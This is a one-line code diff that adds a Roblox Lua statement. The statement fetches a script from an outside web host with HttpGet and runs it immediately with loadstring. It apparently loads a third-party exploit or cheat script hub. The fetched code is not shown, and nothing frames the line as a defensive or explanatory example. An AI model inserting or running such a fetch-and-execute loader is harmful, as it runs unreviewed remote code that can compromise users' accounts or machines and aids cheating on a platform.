@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://key.bloxlegend.com/raw/NightHop"))()
